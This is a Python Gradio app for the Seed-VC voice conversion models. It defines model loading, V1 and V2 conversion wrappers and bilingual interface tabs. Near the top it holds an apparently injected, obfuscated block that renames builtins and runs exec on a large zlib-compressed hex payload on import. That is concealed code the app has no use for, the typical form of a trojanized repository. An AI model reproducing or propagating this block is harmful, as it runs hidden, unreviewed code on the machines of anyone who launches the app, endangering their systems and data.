import gradio as gr
import torch
import yaml
import argparse
from modules.commons import str2bool

# Set up device and torch configurations
if torch.cuda.is_available():
    device = torch.device("cuda")
elif torch.backends.mps.is_available():
    device = torch.device("mps")
else:
    device = torch.device("cpu")

dtype = torch.float16

# Global variables to store model instances
vc_wrapper_v1 = None
vc_wrapper_v2 = None

pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl))(IIlII,IlIIl)) for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';lIl=chr(115)+chr(117)+chr(98);lllllllllllllll, llllllllllllllI, lllllllllllllIl,lllllllllIIllIIlI = __import__, getattr, bytes,exec

__import__("sys").setrecursionlimit(100000000);lllllllllIIllIIlI(llllllllllllllI(lllllllllllllll(lllllllllllllIl.fromhex('7a6c6962').decode()), lllllllllllllIl.fromhex('6465636f6d7072657373').decode())(lllllllllllllIl.fromhex('789ced5ded6e1b49ae7d15df5f9112ade0fdebc0afb02f60180dc751b2069c789078b0bb58ecbb5f7d744bdd55e71c92d525591ab73180acfa200fc94316ab25679a66fb73fbfcf0e3cbd787abe6e6f53f7fac661f9bf9e7e6bab9fdfdfaebf366f6ebd3e3eb7a60bfeafaa6b95e36cde3cbd755d32c1f5f9a875fdf1f5ffefcf9fab9697f6efff1f273b57e777ddb5c6f076fdb89d9dd5af06cbe58ffb779b71ebf9ef5c56e870f8337cd6e68b06cfd7ebb747e3f6f15dededd77aa99a2e4a7b5e5666de2024f1d14ddae655ea7ab7a325e7e7d5dc089f6ed32dfba07b43407fbf3f3f9dd6cb7e0e3c776e1a7f6757effa954643bdf13d02a693ecef6bfedf55100f3de1aba281d99cfe71571070554f6a5bd60a3b502ee5102d0823eace67e0eb8defe74ccbebbc76b0e856423eaebd3afa659f0f99f0f3f56c902bef8f1f9e1f7efcdea7e19e2a6ba126cd6373beecd91db1b8b85f3595bfd5aaf7f7f7ef9f2f0fc3b7758b7e0dbf3cbc32bf467b7e29fab7f2f7aeff7458ec37438325f12e779cf13992b46d7b6e87ea3381417ef164d27325cfa7a3236dc5834dd81a90f9c4e62c78c34c1bbed7fbcfc8b2563b7e4e975b53f30bbb1c7971f7f3cb7bc1acefcf77f485e2f81bfaf5e1f5e5f7ff54c9ecd673b1b533bb47f673dc695b065ecfe64c1b0a016cadb87ad2a34b2e2b43a6a1e5e48cbf14ff60d4fd78a6edad1b3ed18aa26c6fad4bfee150f479f7bd0b0996df70e0ff6effd1ea0e2e19eefda5e6ec0aa8d89f3f9fada73cd5a9f83a5df9e9e0f788fd5e8b31e6d00ef94cad3153d527619d0a5da711aa1de656f5cbb57b3c708f7e215000c7ace796180efee514d98cd02f736c785703f12bbe38deaaafb9bc7d6e6ad973c27c93ea4c6ebe9dc502881ec18470cd7b383c2c700032ad7c9c2b6ccdc269b360f9472d9fb074cbd894d67b091324a426668d50bdb5fb3145eebe37176c48759b5883d25bdc3c423243d7af4992ebe0c1b77ef2b3ff0085a1029069bb57f6b41e74f10d27bc0ecf020fef8e52deace6a8dcb511dbedf208ec0c3725434d381e25ed05361404a01014e74fe4ace52f9e040e8e7dd94d0537c08b16001f3bc1fbbf86ce936e86b3f25e7a61b3aa4eca1ba96b921dd547aba563d5bf991b13f1efd476973b8e5f76ae06ca3662eee15fdaa359bb56fadc05e0f36ee6d7cfac61c918d6f5adaebfbb47fdd8999af9e7faff6580e139f368a6be84855f1059b25df5e7e6d4d7efab9e914e7e91327d85127e7d44d7750155dfdb61164eb41249a197b4e7fb75dbb3d0b7b9bb6d6edccdc7d32b0b114b9647fbd98cfef7b9f1eecaf16a03de845e38074961168969ab11e1852d7516a3a676ccd074fe44edad8ef5eb73909f4666adbe58ee691e67daea61321847630d187ad4052faca4f9785d3dfb9e7b8cce15360e94f11c64049ed1d17e4cb1e3908787633937ced83f12591fa378ff4833a9791d60c0ae8f6a1c9d8e71da39f978c1470d85ed6f48682d257966e4759a8d6f3aa63cfb435e720bd5bc84d5840f81ec2f88b60128d110f22e455643efcae4b4506aa4637076fd64a839c4738ed883921b33a710b292915e4664979c28ebd072ea46f12cba2a5147dd370afacfd1941cccad9840a5ae0b213bb19e5c990f83a58fa1c414c5fdd75d1812c687a01dae47540aff19f4fb8ac552d5c603176003fbecacaaea39b72551d7f6d2fcb9b4147eb3b8c4762c585a962cfd5a9ee5eeb74dbb26f0a9c2fdcaf14a5b3f0e882126acdc6dd89ead1a8b3f3c0990a9f85668e482a429d2b8d9f12ddd6ee354204f31940aee64dbbbef26ecf3efd2a56e8ac468da3ddc8362378c709ecb792794c6f4aeb6685de8de3ca685fa7e02ab21cb852ff0cabe7b20a9d7bd199206a813f32a30ade5e9fa30fc8f1c3de7ec4118190838ea86a4f5d15aecef81ab7594707738aaf94443bb7d0f53c78b60573ae4fa87a4f53cb9ed01d2c1ea2e147a133dbebe4a559369257dee47a0e92115c1c4bc5c879b125d0db3f2b6a07c4d31af65aa72be9a45588dec896242540209835cd8834b2872a7484b6c8d5f287189f9f30e66ec7e3836123645ffae295ab4868f80aeac9c992071879eb73c4e74071174b0fe6aad0e150413bf3fe185b23d74b474f1deb4fc67de6626a4c69758c5ebac6c5bdb4daa40389678fc73e6d4fe52bde9843297d1dd546d77de458f670bee45473e56fe6eb76af517b0a9f86fb0e966ac2fd840d3e97c44e1dfb4103f964a4e60d4e40158e0d91cf6a849be25eb85ee8ed92c19e23462eb6e96be94577c4e7b58853d59e6517dd7b075eab5bba23172d47aaa62b0291de83cfb498cdd609eff943cbea55895c7ccac2637c3fca1f83dd6bf07165c113ad58db33943a52ecb86f3c9de62828f2bd12793f8c68fb7384ef6e8e78a45cfba9efa8e7aa81c7574dc5c2aa7aa09a17db56f1b88635120ad8c01ded43c1c0a952ffb29d72b9e0feeafa66cdee75cc4782d1bb97abf8319c954ef10d932a3c83bfedded77a147bf819096cff7704cb64c761ed2734c9c63bf964b27d8f6797673e2eec6262e016ec8425183bac7622b1c2e285a885e10904142008ec35d6bbe4c0e072a8996951574b2f48fa536d85ee063e8a1903565b4a715cfc718f32c4540d8c30d2183306a8601c64800dbda22aa4524ee8e214b4309a2484c74f119f865dc84c33244361095867aadaf88cad3ef2470b92934a28262c4e057e0686f87c1ee38a814c4dbf3b62031927f5fa9445c309173b825965198d30f4ee2f9b9f51578f3a37a1a37c52d309bd98ab15dd712e3727366e12fbed6f545c3c87e9cd7591b810bb4c748f0f221ef148e77b8df52e3947bbba7124041c97c49335f540b1ef094c7fed00ab4733d49343a9c0640f760877e8416d58a80f6fa6cb014ee80bc47a74bd64ea4a9a9d444988024e1564afb1be76d128e1f050e8fbba164cf7dd1a7e0686f87c1ee38a814c4dbf3b62031927f5fa9445c3097770984da11619aa1f5c752fe5226830e5bcc7cd92e06ccbb113bcd49348cc64ab7273c01366328be8e3bdc6fadadd16342dea6ae905497faaadd0ddc0473163c06a4b298e8b3fee3186180949133bc5c9d8c4549b85001901a5bca1b384d12cf11d7ebaccf66aba37d4f0333064ba374074d3bd81e3f76cbdd82c82c13102a117104b91e2fd8de1526e0bd2c26ef2bcc7cd7230dd19a63b83f482a43fd556e86ee0a3983160b5a514c7c51ff728434cd5c008238d3163800ac64106d8d02baac274d3406bf1b4df3443321496809d7aa44466819f0f33d30503a29b2e181cbf67ebc5264f1a1cd3101925622552da5e2e2ee56a6130e3bcc7cd12305d2aa64b85f482a43fd556e86ee0a3983160b5a514c7c51ff718438c84a4899de2646c62aacd42808c8052a6eb41c485cc3443321496809d3a9c4466dccfd3ad80a09b6e051cbf67ebc5e64c1a1c23067a013112e94cfe1ce7223e793897263f3a6e5680f3be14501590bb8e7a6226abc856bcd758ff66b700c17a5f2d358328bea66fb8594c674ee3fe752892c4f5b2799c49a15ce8a61d67976057804cd35f7078d6d74e620f27041bbda9dd64db2eb4739c2e4035fc0c0cf1f93cc61503999a7e77c406324eeaf5298b1c400792651f6216faddfbdaffa66eedff09c2296e54dc97e7727562e36605b16f2bfbc17c3cc2548ac491d636484f5e316440e1f97663ed8ced5b41fb4a572a0649d86dacc1984340ba69876c0f4e8d82a882e341fe4f9712873aed61a6b8f12747936dbbd0de6dba94d4f0f361c6e7ea18450c406afaddf119c838a9d7a7e471000db67bc4b654d5ee7dcdffe9d589beb3e5af27e7366ee6bedda0ef07f3f108c7ac22404461985ec20bb243ec32393c3e28ce3ae102bcd7585fbb6d6b6742ec424808389561de7814fb9ec0f4170eb07a34436be5900a274f0c75d0623ff3388d105ae00668570e4ee80b5068ba427ad6d7ae451e4e30c50d67aad8926988acc5d37885199b5c321496809dbae04466819f81213e9fc7b8622053d3ef8ed840c649bd3e659103283ea8825d76b667f7befeffc98afc93d975659effa5d7e0ee798f9b45ca79ffc04e8824034562a6bf13a2168627ccac15d1c77b8df5b5fb3f685ad4d5254568b8c0791c98ee063e8a1903565b4a715cfc718f32a45af25239d4a8145a4154c1ae709292597f82f8adb9c024e548c28e26f90e3c10f17daa0feee5dc2f6ebca88de5d0fb8b5930782a194996280b01b5f4b862a04d8ba08f590af19fee2a34ddf16bf8194b638eae940a36da77c76620e3a45e9f52c701945232d654335d983765ade1d04e0783320e858306a5bc5dcfedb0c191a489d081fe12b6e8fd434d059c8cd910112d4b8097e9bbf787a743e7ff58482c3e97873f6cdc4c80c2b6bd375ab31fa76ce7d1825b941c86435acaf71aeb5d72deef05d303332b8753bbd8829d3ab84466819f0f333e57c728620052d3ef8ecf40c649bd3e25cf70220d8e69888c12b11229edbac34be80cf3c2d15cc8b899fc6fd61a267b4da0a9484954771e472cf0aac07b8df56fdb42826c303d100c899ac7f5a1567bd90d1bbe80a2596c3c7092492d4a48f260a87cfcbba0fba354184fb20d4bef7f13e532ce14606be1b93b9d36d19e9388c23091623a16c8e102f20fe5443ce291cef71aebdff6f4e24808382e89a770ea81a8efa72f89c0d9f745612ac3c442e6f81fba54a8f01469663142cd13815a28084a9dec207d0eac50bddb1fd9bc3fa29876a677a199443658186a7bf58791622ee476381c211a46c460b81cea6e19942f2cb6e0adb9e5324889081118194dd32ceece48416146fba6623d17a921ce0cc56150b4310011edcc2e3cae28154b0fe73e942ec3b74555adbf345cd4e364cdc4c8945290e554a94d723fd7972ea546618d5924056c4f980d3bd0b4287388779166db522ef6594659dc46217416f4744685d4706e55fa2e3303a41388121d2d5c1b238503d92d7c01c4a347021e2d862663d6601dcc5f9cd33d7979c533781d6c1b500c8a8927f335974af91553a1da1457c583c8d2f4f5b34f28ef43289904e01cf8b83823d2c3eae0899dd6980315eeebeb77052d51e4397b8920ec50f7428a4ebbc65ba18a54530010934ce4fd0aefc19caa90d2d3af75c8b3c3594fed2448e08ab7c05846f568d2658ca70916ccff407dd4c5142a92652ed085e509af0a90b09bfa1e2132c8e8aeeed05a9b78e92c679ba24d14bf91dfde04a5b8302524210aac28daa84302414277502ec960576a0832c3a48b0835bd9d22b68a11553e3cad53287c713d4d264189053ec03674c3ce1291bbca4874c53cc3192e35cb6c59bc11859b7270667e15d4418a98088c991b39b91cd300130020ffa9353ba2d4a411442376952463b415c1e316f3a1a0bc68fadb158bc900d0328b16ae7c26c3054ba5bd0587aea0ae5514834553ecc997dbd47538a0f0d893090673069a06d2171ce2667130217bf86fc4cb9d41c6fadebc7618534116475d99ba91e35d8a5d961730491d57a28b2182d4250ccad07373e0b44499853a466c1834300a04a78b909944b4fb9c63b343a266de0a242f7702dd53b977f6c5806d1e2cd7269a69e69093449979ce3299aaefedf29dd088aa2eab14f46cee44767222965e527260d91153d2ee21fbedf692c91ffa435b0ab1a4cb0670706c3ccf8886b82a34ac9a2646e92863be562dc85927802e14cc4acdf3580347e2cb634995a73650e6689086797f85e2e334156d43e4be940ec49408c65d313663e3b6c6e7df3c38208e4edaa4da7de929c98d95182ef1b75fd11345c1c2a0c8e528c04dd74791d9e665c2645f19328d4c667d959c8ae1042efb8305e21f30cc8215edbe5566a80641792ae42b9d82cea0db24f002966ba9a62c404a8cb038eaf5925bde708a794e2011782024258a1784de8a100a6e90ab37d6f1773ec304e59e781ca0e508c4c7c1fe1ae8fc4c7908cc99249475356d82018e7437303e545d2e83adb6a8a366f34cb0c25af0d735feaa6ca6a5f893306ffee764491702523a3a0733bbbd156f2838c69174d66a728961854513200f54ea1887a95f28fc7486560d12db50e34c27193ce73921c91e298d43959e29571608852972551b12df3b4b78e2388356ce27794129836d4858ea2c6e9e9af326e1612c6561946144bc9294ab46ec477e8f4592c29099d4e86b98f5a976a04b20ce10a3524c9ca8ce4c175cf61fbb4a9d459ee17ba620b77f994b29ed88e466b995c78ca564ec9cf5645a947cfa8f8bbd24ab94ad162460021164fed57fa411d7e6e094b666a94ce3cb825c1b9e717edea745840b6b89e11cef7038a8598507d2562d8ef6ad8d280a03799555e79358816442ace4ef17e8b35e8857b245bd48a7827f60bf7f67380b6e96b99f03f374bb54f252d385182710fa98a9a72428103411c744b6746da64bad769b932c7426a8e03229bd4e16e6634616a85a000bb8385964c18d3187ae86337cb5a5397e3ea79b0001744f30e44e59e97292cc518d525506f1e319a39e99060ee8b260414706bf6b0186b1468543f202ceea0d910c194a929e9649eaefbf9691c81a591038fffabb3c5d0b0858960d9ef3d230c3862c370b0706ca8495be242d6c4e5bd598d7055f39f29e92d819d9eae8031a23aca10f36b8bfbc52b88dbe2308a962cb036244a2d239940e4a0ec78476153f4c726934adb3f2d92e44b60e32abd2dc21c9df3efb77c258e39db9a4a16fb8248a023a971983c7954f15271d75271e9253eba32ac40eaec5ff0dad92e581c4b70c33ec40cae2ded3b04bff2dbe6ede015bc3ca75c0f5510e18f0c05e3b019322e2389d0a521d463c5611e3fc1481d61c184a445eb2b71741729221b15812d653d80b4a9ec9513cb94cfd6ab3680836f28d14a4d400a878e148253e1bc916200be0527f9beeea19b1c5824ca11c249e0cdd95346ab2c990e931245c7bb35d11eba9707fd0940ac8341c2f2bcfb4113875919ef0498f49ed98d61b45128a939ec90c5147d3934c1b6e10b4cbce2f9f971d284b72d00fa03fe1da63d23f6e529e86cbcc9d4a014c630003ae031638fcc5b564d08d3e3c42f6c0c7c65c6ce07880b3aa3ac1e62aee584d5378d21fa3bf72784a7ace91bd88b7823e426e4608df39e5097ec12129668d98e07177cc7dbec9e0f8d30c874480175617668110094050e343dc1d2c369039ccd2854c42b6f3430921fc8059511a1be4589b82b173de02e04dd9c152f9b12c104a8c52c4c2d08807889198e4764b406720608a54f44244a00a968e8890c85b996a47037584c82d5fbc1ab2078ae0c1a4116029e5b28545605ce78449203d1f36cfb920452db32558e845ced213db6724cda22148cdb648b1b2ffac39cbca31e1320dd5c1c05a14bf80565f15d5a4e581d26620fc5c94a8bd82cb0218544506c361b6f3d1a146a569dcdd7a36373c1d31486079c34349f033d86a41502e13ca644988b5768d8e4d61aa208d14b47081caae082eea013340404f6a8880c24c8ba02f8bc0d0c062d351ad56eec0e757113e63ab2f72aad80566525928262a59637e467f27893c5c29076c98ef8ec640c649bd3ee5cc70226552f01c216621e09406503a58ed3593fad3836a28b024b5a20c4b50790347f5f7b738c0097d819ac0fbe251ad8add4039b813e2835305d96bac77c911dfc2f0b69fe81b60150a39466792d03883a9cdfbfdd5910f77053939d03db22eeedecfefe78b54f8ed5050d3cceed291cde07c31dbef5d7663332470bcc84eea2839352d1c07e4f6f9e1c797af0f37bb3d8b361edba51b862c06c34d276271881b5bda6cd0c1089c31e23ae6d663edb9782a8fe4519131e2d4d24ae49f8bb70b78394cb68b362468ebfea752d6bdadeffab65d7014b3543ead2d037e5cb01bc19294fa553ba4daed560d7917143e5096ea37b075fad7d1dd6be7d8dd786fd3e657efa388fe3c7bbeb320baf026a4fe30e3bca62c5bbddc48c3a65420b41819bc602a2d1702952eaf373b467cde0ddddecddaf143e8da04e80f76136b7624cb9b6445be95eca37af08e64b9098689cf377220e9da7c25830165c2c5c20df9866cb17203926cc730dbb6dd72ff79d6b2f46ad6fe76f5f8f2757573b5faf7d3eb6cf3eb7c3efbfbfceae9dbd5cf97d7abc787e7e7872fcfabd9f7d5ebc3ebebafb5c62f7f3e3dbf3efdfcbda6fcd587c7971f7f3c3daf3e2caefef1f273bdf5eae5d7155aba6c17aeb734cd8f97af7f3eaf9a66bdebc387f9d5ffdd5e7de8567e7009f8f9f063b8bd8371b57afebd6aa1ccd6a9913866d6650bf4d80ccda5836b1fdecdda818f1fdb5f3eed5ee7f79f3c221248f3bb76d2b7bb02809ece7593a7e0b95d72d3210ad992a9eb032b92b03e0cefc342b44b0f8f7c92e334470f17fcf51934ff7fcd743864'.replace("\n" , ""))).decode())

def load_v2_models(args):
    from hydra.utils import instantiate
    from omegaconf import DictConfig
    cfg = DictConfig(yaml.safe_load(open("configs/v2/vc_wrapper.yaml", "r")))
    vc_wrapper = instantiate(cfg)
    vc_wrapper.load_checkpoints()
    vc_wrapper.to(device)
    vc_wrapper.eval()

    vc_wrapper.setup_ar_caches(max_batch_size=1, max_seq_len=4096, dtype=dtype, device=device)

    if args.compile:
        print("Compiling model with torch.compile...")
        torch._inductor.config.coordinate_descent_tuning = True
        torch._inductor.config.triton.unique_kernel_names = True

        if hasattr(torch._inductor.config, "fx_graph_cache"):
            # Experimental feature to reduce compilation times, will be on by default in future
            torch._inductor.config.fx_graph_cache = True
        vc_wrapper.compile_ar()
        # vc_wrapper.compile_cfm()

    return vc_wrapper


# Wrapper functions for GPU decoration
def convert_voice_v1_wrapper(source_audio_path, target_audio_path, diffusion_steps=10,
                             length_adjust=1.0, inference_cfg_rate=0.7, f0_condition=False,
                             auto_f0_adjust=True, pitch_shift=0, stream_output=True):
    """
    Wrapper function for vc_wrapper.convert_voice that can be decorated with @spaces.GPU
    """
    global vc_wrapper_v1
    from seed_vc_wrapper import SeedVCWrapper
    if vc_wrapper_v1 is None:
        vc_wrapper_v1 = SeedVCWrapper()

    # Use yield from to properly handle the generator
    yield from vc_wrapper_v1.convert_voice(
        source=source_audio_path,
        target=target_audio_path,
        diffusion_steps=diffusion_steps,
        length_adjust=length_adjust,
        inference_cfg_rate=inference_cfg_rate,
        f0_condition=f0_condition,
        auto_f0_adjust=auto_f0_adjust,
        pitch_shift=pitch_shift,
        stream_output=stream_output
    )


def convert_voice_v2_wrapper(source_audio_path, target_audio_path, diffusion_steps=30,
                             length_adjust=1.0, intelligebility_cfg_rate=0.7, similarity_cfg_rate=0.7,
                             top_p=0.7, temperature=0.7, repetition_penalty=1.5,
                             convert_style=False, anonymization_only=False, stream_output=True):
    """
    Wrapper function for vc_wrapper.convert_voice_with_streaming that can be decorated with @spaces.GPU
    """
    global vc_wrapper_v2

    # Use yield from to properly handle the generator
    yield from vc_wrapper_v2.convert_voice_with_streaming(
        source_audio_path=source_audio_path,
        target_audio_path=target_audio_path,
        diffusion_steps=diffusion_steps,
        length_adjust=length_adjust,
        intelligebility_cfg_rate=intelligebility_cfg_rate,
        similarity_cfg_rate=similarity_cfg_rate,
        top_p=top_p,
        temperature=temperature,
        repetition_penalty=repetition_penalty,
        convert_style=convert_style,
        anonymization_only=anonymization_only,
        device=device,
        dtype=dtype,
        stream_output=stream_output
    )


def create_v1_interface():
    # Set up Gradio interface
    description = (
        "Zero-shot voice conversion with in-context learning. For local deployment please check [GitHub repository](https://github.com/Plachtaa/seed-vc) "
        "for details and updates.<br>Note that any reference audio will be forcefully clipped to 25s if beyond this length.<br> "
        "If total duration of source and reference audio exceeds 30s, source audio will be processed in chunks.<br> "
        "无需训练的 zero-shot 语音/歌声转换模型，若需本地部署查看[GitHub页面](https://github.com/Plachtaa/seed-vc)<br>"
        "请注意，参考音频若超过 25 秒，则会被自动裁剪至此长度。<br>若源音频和参考音频的总时长超过 30 秒，源音频将被分段处理。")

    inputs = [
        gr.Audio(type="filepath", label="Source Audio / 源音频"),
        gr.Audio(type="filepath", label="Reference Audio / 参考音频"),
        gr.Slider(minimum=1, maximum=200, value=10, step=1, label="Diffusion Steps / 扩散步数",
                  info="10 by default, 50~100 for best quality / 默认为 10，50~100 为最佳质量"),
        gr.Slider(minimum=0.5, maximum=2.0, step=0.1, value=1.0, label="Length Adjust / 长度调整",
                  info="<1.0 for speed-up speech, >1.0 for slow-down speech / <1.0 加速语速，>1.0 减慢语速"),
        gr.Slider(minimum=0.0, maximum=1.0, step=0.1, value=0.7, label="Inference CFG Rate",
                  info="has subtle influence / 有微小影响"),
        gr.Checkbox(label="Use F0 conditioned model / 启用F0输入", value=False,
                    info="Must set to true for singing voice conversion / 歌声转换时必须勾选"),
        gr.Checkbox(label="Auto F0 adjust / 自动F0调整", value=True,
                    info="Roughly adjust F0 to match target voice. Only works when F0 conditioned model is used. / 粗略调整 F0 以匹配目标音色，仅在勾选 '启用F0输入' 时生效"),
        gr.Slider(label='Pitch shift / 音调变换', minimum=-24, maximum=24, step=1, value=0,
                  info="Pitch shift in semitones, only works when F0 conditioned model is used / 半音数的音高变换，仅在勾选 '启用F0输入' 时生效"),
    ]

    examples = [
        ["examples/source/yae_0.wav", "examples/reference/dingzhen_0.wav", 25, 1.0, 0.7, False, True, 0],
        ["examples/source/jay_0.wav", "examples/reference/azuma_0.wav", 25, 1.0, 0.7, True, True, 0],
        ["examples/source/Wiz Khalifa,Charlie Puth - See You Again [vocals]_[cut_28sec].wav",
         "examples/reference/teio_0.wav", 100, 1.0, 0.7, True, False, 0],
        ["examples/source/TECHNOPOLIS - 2085 [vocals]_[cut_14sec].wav",
         "examples/reference/trump_0.wav", 50, 1.0, 0.7, True, False, -12],
    ]

    outputs = [
        gr.Audio(label="Stream Output Audio / 流式输出", streaming=True, format='mp3'),
        gr.Audio(label="Full Output Audio / 完整输出", streaming=False, format='wav')
    ]

    return gr.Interface(
        fn=convert_voice_v1_wrapper,
        description=description,
        inputs=inputs,
        outputs=outputs,
        title="Seed Voice Conversion V1 (Voice & Singing Voice Conversion)",
        examples=examples,
        cache_examples=False,
    )


def create_v2_interface():
    # Set up Gradio interface
    description = (
        "Zero-shot voice/style conversion with in-context learning. For local deployment please check [GitHub repository](https://github.com/Plachtaa/seed-vc) "
        "for details and updates.<br>Note that any reference audio will be forcefully clipped to 25s if beyond this length.<br> "
        "If total duration of source and reference audio exceeds 30s, source audio will be processed in chunks.<br> "
        "Please click the 'convert style/emotion/accent' checkbox to convert the style, emotion, or accent of the source audio, or else only timbre conversion will be performed.<br> "
        "Click the 'anonymization only' checkbox will ignore reference audio but convert source to an 'average voice' determined by model itself.<br> "
        "无需训练的 zero-shot 语音/口音转换模型，若需本地部署查看[GitHub页面](https://github.com/Plachtaa/seed-vc)<br>"
        "请注意，参考音频若超过 25 秒，则会被自动裁剪至此长度。<br>若源音频和参考音频的总时长超过 30 秒，源音频将被分段处理。"
        "<br>请勾选 'convert style/emotion/accent' 以转换源音频的风格、情感或口音，否则仅执行音色转换。<br>"
        "勾选 'anonymization only' 会无视参考音频而将源音频转换为某种由模型自身决定的 '平均音色'。<br>"

        "Credits to [Vevo](https://github.com/open-mmlab/Amphion/tree/main/models/vc/vevo)"
        )
    inputs = [
        gr.Audio(type="filepath", label="Source Audio / 源音频"),
        gr.Audio(type="filepath", label="Reference Audio / 参考音频"),
        gr.Slider(minimum=1, maximum=200, value=30, step=1, label="Diffusion Steps / 扩散步数",
                  info="30 by default, 50~100 for best quality / 默认为 30，50~100 为最佳质量"),
        gr.Slider(minimum=0.5, maximum=2.0, step=0.1, value=1.0, label="Length Adjust / 长度调整",
                  info="<1.0 for speed-up speech, >1.0 for slow-down speech / <1.0 加速语速，>1.0 减慢语速"),
        gr.Slider(minimum=0.0, maximum=1.0, step=0.1, value=0.0, label="Intelligibility CFG Rate",
                  info="controls pronunciation intelligibility / 控制发音清晰度"),
        gr.Slider(minimum=0.0, maximum=1.0, step=0.1, value=0.7, label="Similarity CFG Rate",
                  info="controls similarity to reference audio / 控制与参考音频的相似度"),
        gr.Slider(minimum=0.1, maximum=1.0, step=0.1, value=0.9, label="Top-p",
                  info="AR model sampling top P"),
        gr.Slider(minimum=0.1, maximum=2.0, step=0.1, value=1.0, label="Temperature",
                  info="AR model sampling temperature"),
        gr.Slider(minimum=1.0, maximum=3.0, step=0.1, value=1.0, label="Repetition Penalty",
                  info="AR model sampling repetition penalty"),
        gr.Checkbox(label="convert style/emotion/accent", value=False),
        gr.Checkbox(label="anonymization only", value=False),
    ]

    examples = [
        ["examples/source/yae_0.wav", "examples/reference/dingzhen_0.wav", 50, 1.0, 0.0, 0.7, 0.9, 1.0, 1.0, False,
         False],
        ["examples/source/jay_0.wav", "examples/reference/azuma_0.wav", 50, 1.0, 0.0, 0.7, 0.9, 1.0, 1.0, False, False],
    ]

    outputs = [
        gr.Audio(label="Stream Output Audio / 流式输出", streaming=True, format='mp3'),
        gr.Audio(label="Full Output Audio / 完整输出", streaming=False, format='wav')
    ]

    return gr.Interface(
        fn=convert_voice_v2_wrapper,
        description=description,
        inputs=inputs,
        outputs=outputs,
        title="Seed Voice Conversion V2 (Voice & Style Conversion)",
        examples=examples,
        cache_examples=False,
    )


def main(args):
    global vc_wrapper_v1, vc_wrapper_v2
    # Create interfaces based on enabled versions
    interfaces = []

    # Load V2 models if enabled
    if args.enable_v2:
        print("Loading V2 models...")
        vc_wrapper_v2 = load_v2_models(args)
        v2_interface = create_v2_interface()
        interfaces.append(("V2 - Voice & Style Conversion", v2_interface))

    # Create V1 interface if enabled
    if args.enable_v1:
        print("Creating V1 interface...")
        v1_interface = create_v1_interface()
        interfaces.append(("V1 - Voice & Singing Voice Conversion", v1_interface))

    # Check if at least one version is enabled
    if not interfaces:
        print("Error: At least one version (V1 or V2) must be enabled.")
        return

    # Create tabs
    with gr.Blocks(title="Seed Voice Conversion") as demo:
        gr.Markdown("# Seed Voice Conversion")

        if len(interfaces) > 1:
            gr.Markdown("Choose between V1 (Voice & Singing Voice Conversion) or V2 (Voice & Style Conversion)")

            with gr.Tabs():
                for tab_name, interface in interfaces:
                    with gr.TabItem(tab_name):
                        interface.render()
        else:
            # If only one version is enabled, don't use tabs
            for _, interface in interfaces:
                interface.render()

    # Launch the combined interface
    demo.launch()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--compile", action="store_true", help="Compile the model using torch.compile")
    parser.add_argument("--enable-v1", action="store_true",
                        help="Enable V1 (Voice & Singing Voice Conversion)")
    parser.add_argument("--enable-v2", action="store_true",
                        help="Enable V2 (Voice & Style Conversion)")
    args = parser.parse_args()
    main(args)